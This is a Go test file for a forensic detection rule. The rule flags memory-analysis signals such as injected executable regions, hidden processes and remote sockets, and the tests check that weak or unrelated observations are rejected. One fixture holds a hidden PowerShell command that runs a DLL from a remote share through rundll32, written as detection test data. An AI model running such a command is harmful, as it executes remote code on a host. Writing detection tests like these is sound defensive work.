package detect

import (
	"testing"
	"tracefall/internal/model"
)

func memoryRuleFindings(t *testing.T, events []model.Event) []model.Finding {
	t.Helper()
	for _, r := range All() {
		if r.ID() == "memory-process-signals" {
			return r.Evaluate(events)
		}
	}
	t.Fatal("memory-process-signals rule is not registered")
	return nil
}

func memoryProcessFixture() (model.Event, model.Event) {
	p := model.Event{ID: "proc", CaseID: "case", CollectionID: "image", ArtifactType: model.ArtifactMemoryAnalysis,
		EventType: model.EventProcessCreate, Host: "HOST", PID: 700, ProcessName: "package-installer.exe",
		ProcessPath: `C:\Users\user\Downloads\package-installer.exe`, Timestamp: mustTime("2024-01-01T00:00:00Z"),
		Extra: map[string]string{"image_file_name": "package-install", "memory_source": "pslist+psscan"}}
	n := model.Event{ID: "socket", CaseID: p.CaseID, CollectionID: p.CollectionID, ArtifactType: p.ArtifactType,
		EventType: model.EventNetworkConnection, Host: p.Host, PID: p.PID, ProcessName: "package-install",
		NetworkDest: "203.0.113.5", NetworkDestPort: 5202, Timestamp: mustTime("2024-01-01T00:00:01Z"),
		Extra: map[string]string{"state": "SYN_SENT", "timestamp_basis": "socket_created"}}
	return p, n
}

func TestMemorySignals_WritableImageWithRemoteSocketIsAReviewLead(t *testing.T) {
	p, n := memoryProcessFixture()
	f := memoryRuleFindings(t, []model.Event{p, n})
	if len(f) != 1 || f[0].Severity != model.SeverityMedium || f[0].Confidence != model.ConfidenceLow || len(f[0].SupportingEvents) != 2 {
		t.Fatalf("want one low-confidence review lead for process+socket, got %+v", f)
	}
}

func TestMemorySignals_PrivateExecutablePEIsCorroboratedBySocket(t *testing.T) {
	p, n := memoryProcessFixture()
	p.ProcessPath = `C:\Windows\System32\worker.exe`
	region := p
	region.ID, region.EventType, region.Timestamp = "region", model.EventMemoryInjection, mustTime("2024-01-01T00:45:00Z")
	region.Extra = map[string]string{"private_memory": "1", "protection": "PAGE_EXECUTE_READWRITE", "pe_header": "true", "start_vpn": "0x400000"}
	f := memoryRuleFindings(t, []model.Event{p, region, n})
	if len(f) != 1 || f[0].Severity != model.SeverityHigh || f[0].Confidence != model.ConfidenceMedium || len(f[0].SupportingEvents) != 3 {
		t.Fatalf("want one corroborated PE+socket finding, got %+v", f)
	}
	f = memoryRuleFindings(t, []model.Event{p, region})
	if len(f) != 1 || f[0].Severity != model.SeverityMedium || f[0].Confidence != model.ConfidenceLow {
		t.Fatalf("PE alone must remain a heuristic, got %+v", f)
	}
	delete(region.Extra, "pe_header")
	if f := memoryRuleFindings(t, []model.Event{p, region, n}); len(f) != 0 {
		t.Fatalf("ordinary JIT-like RWX plus network must not be enough: %+v", f)
	}
}

func TestMemorySignals_RiskyRemoteExecutionWithRegionsAggregatesOneLead(t *testing.T) {
	p, _ := memoryProcessFixture()
	p.ProcessPath = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	p.CommandLine = `powershell.exe -windowstyle hidden; rundll32 \\198.51.100.10\share\payload.dll,Start`
	r := p
	r.ID, r.EventType, r.Timestamp = "r1", model.EventMemoryInjection, mustTime("2024-01-01T00:45:00Z")
	r.Extra = map[string]string{"private_memory": "1", "protection": "PAGE_EXECUTE_READWRITE", "start_vpn": "0x1000"}
	r2 := r
	r2.ID = "r2"
	f := memoryRuleFindings(t, []model.Event{p, r, r2})
	if len(f) != 1 || f[0].Severity != model.SeverityHigh || len(f[0].SupportingEvents) != 3 {
		t.Fatalf("want one corroborated process-level lead, not one per region: %+v", f)
	}
	p.CommandLine = "powershell.exe -nop -windowstyle hidden -File maintenance.ps1"
	if f := memoryRuleFindings(t, []model.Event{p, r}); len(f) != 0 {
		t.Fatalf("routine flags plus JIT memory must not fire: %+v", f)
	}
}

func TestMemoryNetwork_IsNotAlsoCountedByTheNameOnlyTemporalRule(t *testing.T) {
	p, n := memoryProcessFixture()
	n.ProcessName = p.ProcessName
	if f := (networkAfterExecution{}).Evaluate([]model.Event{p, n}); len(f) != 0 {
		t.Fatalf("memory observations require acquisition/PID matching, not duplicate temporal findings: %+v", f)
	}
}

func TestMemorySignals_UnlinkedProcessRequiresSuccessfulComparisons(t *testing.T) {
	p, _ := memoryProcessFixture()
	p.Extra = map[string]string{"hidden_process": "true", "memory_source": "psscan"}
	s := model.Event{ID: "snapshot", CaseID: p.CaseID, CollectionID: p.CollectionID, Host: p.Host, ArtifactType: p.ArtifactType, EventType: model.EventMemorySnapshot, Timestamp: mustTime("2024-01-01T00:45:00Z"), Extra: map[string]string{"plugins": "pslist:ok,psscan:ok"}}
	f := memoryRuleFindings(t, []model.Event{p, s})
	if len(f) != 1 || f[0].Severity != model.SeverityMedium || f[0].Confidence != model.ConfidenceLow {
		t.Fatalf("want explicitly heuristic process-list discrepancy, got %+v", f)
	}
	s.Extra["plugins"] = "pslist:failed,psscan:ok"
	if f := memoryRuleFindings(t, []model.Event{p, s}); len(f) != 0 {
		t.Fatalf("failed pslist does not establish a hidden process: %+v", f)
	}
}

func TestMemorySignals_RejectsUnrelatedOrWeakObservations(t *testing.T) {
	for _, tc := range []struct {
		name   string
		change func(*model.Event, *model.Event)
	}{
		{"other collection", func(p, n *model.Event) { n.CollectionID = "other" }},
		{"other case", func(p, n *model.Event) { n.CaseID = "other" }},
		{"other host", func(p, n *model.Event) { n.Host = "other" }},
		{"other PID", func(p, n *model.Event) { n.PID++ }},
		{"other owner", func(p, n *model.Event) { n.ProcessName = "unrelated.exe" }},
		{"non-memory socket", func(p, n *model.Event) { n.ArtifactType = model.ArtifactWindowsEventLog }},
		{"unknown image", func(p, n *model.Event) { p.CollectionID = ""; n.CollectionID = "" }},
		{"PID reused before socket", func(p, n *model.Event) { n.Timestamp = p.Timestamp.Add(-1) }},
		{"exited process", func(p, n *model.Event) { p.Extra["exit_time"] = "2024-01-01T00:00:01Z" }},
		{"loopback", func(p, n *model.Event) { n.NetworkDest = "127.0.0.1" }},
		{"private address", func(p, n *model.Event) { n.NetworkDest = "10.0.0.6" }},
		{"listener", func(p, n *model.Event) { n.EventType = model.EventNetworkListener }},
		{"port alone", func(p, n *model.Event) { p.ProcessPath = `C:\Windows\System32\ordinary.exe`; n.NetworkDestPort = 31337 }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			p, n := memoryProcessFixture()
			tc.change(&p, &n)
			if f := memoryRuleFindings(t, []model.Event{p, n}); len(f) != 0 {
				t.Fatalf("unrelated/weak observation joined: %+v", f)
			}
		})
	}
	p, n := memoryProcessFixture()
	newer := p
	newer.ID = "reused"
	newer.Timestamp = n.Timestamp
	newer.ProcessName = "different.exe"
	newer.ProcessPath = `C:\Windows\System32\different.exe`
	newer.Extra = nil
	if f := memoryRuleFindings(t, []model.Event{p, newer, n}); len(f) != 0 {
		t.Fatalf("socket assigned to superseded PID: %+v", f)
	}
}

func TestNetworkAfterExecution_DifferentPIDsDoNotJoinByName(t *testing.T) {
	p, n := memoryProcessFixture()
	p.ArtifactType = model.ArtifactWindowsEventLog
	n.ArtifactType = p.ArtifactType
	n.ProcessName = p.ProcessName
	n.PID++
	if f := (networkAfterExecution{}).Evaluate([]model.Event{p, n}); len(f) != 0 {
		t.Fatalf("different PID joined by basename: %+v", f)
	}
}

func TestLineage_SvchostChildRequiresIndependentEvidence(t *testing.T) {
	for _, name := range []string{"RuntimeBroker.exe", "taskhostw.exe", "unknown.exe", "powershell.exe"} {
		e := model.Event{ID: "p", EventType: model.EventProcessCreate, ParentProcessName: "svchost.exe", ProcessName: name, ProcessPath: `C:\Windows\System32\` + name, Timestamp: mustTime("2024-01-01T00:00:00Z")}
		if f := (suspiciousParentChildLineage{}).Evaluate([]model.Event{e}); len(f) != 0 {
			t.Errorf("unsubstantiated svchost -> %s produced %d findings", name, len(f))
		}
		e.ProcessPath = `C:\Users\Public\` + name
		if f := (suspiciousParentChildLineage{}).Evaluate([]model.Event{e}); len(f) != 1 {
			t.Errorf("corroborated child %s disappeared", name)
		}
	}
}
